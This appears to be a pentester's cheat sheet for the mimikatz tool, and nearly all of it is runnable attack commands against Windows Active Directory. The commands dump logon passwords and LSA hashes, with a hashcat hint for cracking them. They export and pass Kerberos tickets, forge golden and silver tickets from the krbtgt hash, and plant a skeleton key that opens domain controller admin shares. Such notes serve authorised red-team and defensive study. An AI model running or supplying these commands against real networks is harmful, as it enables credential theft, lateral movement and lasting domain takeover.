# mimikatz

* [PowerShellMafia/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

## check

```bash
privilege::debug
# Privilege '20' OK => Working properly
```

## dump password / hashes

```bash
# dump logon users pass
sekurlsa::logonpasswords

# dump hashes
lsadump::lsa [/inject | /patch]
# hashcat -m 1000 <hash>
```

## Pass-the-ticket

```bash
# exports all .kirbi to current directory
sekurlsa::tickets /export

# PTT using admin .kirbi 
kerberos::ptt TICKET

# to check if ticket is working
> klist
```

## Golden / Silver Ticket

```bash
# dump hash and SID
lsadump::lsa /inject /name: [krbtgt | DOMAIN_ADMIN_ACCOUNT | SERVICE_ACCOUNT] 

# create golden ticket and pass-the-ticket
kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:500 /ptt
# create silver ticket and pass-the-ticket
kerberos::golden /user:<USER> /domain:DOMAINM /sid:SID /krbtgt:SERVICE_NTLM_hash /id:1103 /ptt

# check
misc::cmd
dir \\IP\c$ [/user:USER PASS]
PsExec.exe \\IP cmd.exe

```

## kerberos Skeleton Key

```bash
misc::skeleton

# done, now accessing admin share
> net use C:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
> dir \\Desktop-1\c$ /user:Machine1 mimikatz
```